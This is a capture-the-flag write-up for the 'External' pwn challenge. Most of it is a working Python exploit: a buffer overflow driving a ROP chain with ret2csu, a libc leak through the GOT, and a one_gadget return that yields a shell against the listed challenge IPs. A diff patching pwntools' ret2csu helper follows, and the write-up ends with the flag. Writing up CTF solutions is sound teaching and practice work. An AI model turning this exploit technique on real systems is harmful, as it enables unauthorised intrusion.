# External

EU instance: 161.97.176.150 9999

US instance: 185.172.165.118 9999

author: M_alpha

**Files**: `libc-2.28.so`, `external`							 										

## Solving
I really didn't like this challenge, so here's a plain exploit script:
```python
from pwnscripts import *
context.libc_database = 'libc-database'
context.libc = 'libc-2.28.so'
context.binary = 'external'
scratch = context.binary.bss(0x500) # r/w place to dump ROP chain
context.log_level = 'debug'
r = remote('161.97.176.150', 9999)

# increase rop chain size
R = ROP(context.binary)
sys_ret = R.find_gadget(['syscall', 'ret'])
R.raw(b'a'*0x50)  # padding required for overflow
R.raw(scratch)
R.ret2csu(edi=0, rsi=scratch, rdx=999, rbp=scratch-8)
R.raw(sys_ret)    # call SYS_read(0, scratch, 999)
R.raw(context.binary.symbols['main']+0x45) # mov eax, 0; leave; ret;
r.sendafter('> ', R.chain())
# leak libc
R = ROP(context.binary)
R.write_syscall(1, context.binary.got['__libc_start_main'])
R.ret2csu(edi=1, rsi=scratch, rdx=0)
R.write_syscall() # this will set eax to 0
R.ret2csu(edi=0, rsi=scratch, rdx=999, rbp=scratch-8)
R.raw(sys_ret)    # call SYS_read(0, scratch, 999)
R.raw(context.binary.symbols['main']+0x45) # mov eax, 0; leave; ret;
r.send(R.chain())
# return to one_gadget
context.libc.symbols['__libc_start_main'] = unpack_bytes(r.recv(0x38),6)
R = ROP(context.binary)
R.raw(context.libc.select_gadget(1)) # libc-2.28 means there are good one_gadgets
R.raw(b'\0'*0x100)
r.sendline(R.chain())
r.interactive()
```
This script won't work if you try it yourself. To get ret2csu done automatically, I grabbed the code for pwntools' [`rop.ret2csu` pull request](https://github.com/Gallopsled/pwntools/pull/1429) and made a few changes:
```diff
diff --git a/pwnlib/rop/ret2csu.py b/pwnlib/rop/ret2csu.py
index 39eef821..350efc1d 100644
--- a/pwnlib/rop/ret2csu.py
+++ b/pwnlib/rop/ret2csu.py
@@ -56,33 +56,22 @@ def ret2csu(rop, elf, edi, rsi, rdx, rbx, rbp, r12, r13, r14, r15, call=None):
     csu_function = elf.read(elf.sym['__libc_csu_init'], elf.sym['__libc_csu_fini'] - elf.sym['__libc_csu_init'])

     # 1st gadget: Populate registers in preparation for 2nd gadget
-    for insn in md.disasm(csu_function, elf.sym['__libc_csu_init']):
+    for i,insn in enumerate(md.disasm(csu_function, elf.sym['__libc_csu_init'])):
         if insn.mnemonic == 'pop' and insn.operands[0].reg == X86_REG_RBX:
             rop.raw(insn.address)
             break
+        if insn.mnemonic == 'call': call_index = i
     # rbx and rbp must be equal after 'add rbx, 1'
     rop.raw(0x00)  # pop rbx
     rop.raw(0x01)  # pop rbp
-    if call:
-        rop.raw(call)  # pop r12
-    else:
-        rop.raw(fini)  # pop r12

     # Older versions of gcc use r13 to populate rdx then r15d to populate edi, newer versions use the reverse
     # Account for this when the binary was linked against a glibc that was built with a newer gcc
-    for insn in md.disasm(csu_function, elf.sym['__libc_csu_init']):
-        if insn.mnemonic == 'mov' and insn.operands[0].reg == X86_REG_RDX and insn.operands[1].reg == X86_REG_R13:
-            rop.raw(rdx)  # pop r13
-            rop.raw(rsi)  # pop r14
-            rop.raw(edi)  # pop r15
-            rop.raw(insn.address)
-            break
-        elif insn.mnemonic == 'mov' and insn.operands[0].reg == X86_REG_RDX and insn.operands[1].reg == X86_REG_R15:
-            rop.raw(edi)  # pop r13
-            rop.raw(rsi)  # pop r14
-            rop.raw(rdx)  # pop r15
-            rop.raw(insn.address)
-            break
+    reg_mapping = dict(reversed(list(map(lambda op: insn.reg_name(op.reg)[:3], insn.operands))) for insn in list(md.disasm(csu_function, elf.sym['__libc_csu_init']))[call_index-3:call_index])
+    for reg in ['r12', 'r13', 'r14']: rop.raw(eval(reg_mapping[reg]))
+    if call: rop.raw(call)  # pop r15
+    else: rop.raw(fini)  # pop r15
+    rop.raw(list(md.disasm(csu_function, elf.sym['__libc_csu_init']))[call_index-3].address)

     # 2nd gadget: Populate edi, rsi & rdx. Populate optional registers
     rop.raw(Padding('<add rsp, 8>'))  # add rsp, 8
```
You can try manually applying this yourself, or you might want to just wait for the `rop.ret2csu` dev to finish his module.

Anyway, here is the flag:

## Flag
`flag{0h_nO_My_G0t!!!!1111!1!}`
